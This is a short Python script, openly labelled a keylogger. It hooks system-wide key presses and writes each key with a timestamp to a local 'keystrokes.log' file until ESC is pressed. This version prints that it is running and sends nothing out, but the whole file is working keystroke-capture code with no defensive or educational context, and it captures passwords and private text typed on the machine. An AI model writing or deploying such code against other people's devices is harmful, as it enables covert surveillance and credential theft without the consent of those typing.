import keyboard
import datetime
import os

LOG_FILE = "keystrokes.log"

def on_press(event):
    """Callback function to log each key press with a timestamp."""
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            key = event.name

            # Handle special keys for readability
            if len(key) > 1:
                key = f"[{key.upper()}]"

            f.write(f"{timestamp}: {key}\n")

    except Exception as e:
        print(f"Error logging key: {e}")

def start_keylogger():
    """Start the keylogger and listen for keyboard events."""
    print(f"Keylogger started. Logging keystrokes to '{os.path.abspath(LOG_FILE)}'")
    print("Press 'ESC' to stop the keylogger.")

    keyboard.on_press(on_press)

    # The keylogger will stop when ESC is pressed
    keyboard.wait('esc')

    print("Keylogger stopped.")

if __name__ == "__main__":
    start_keylogger()
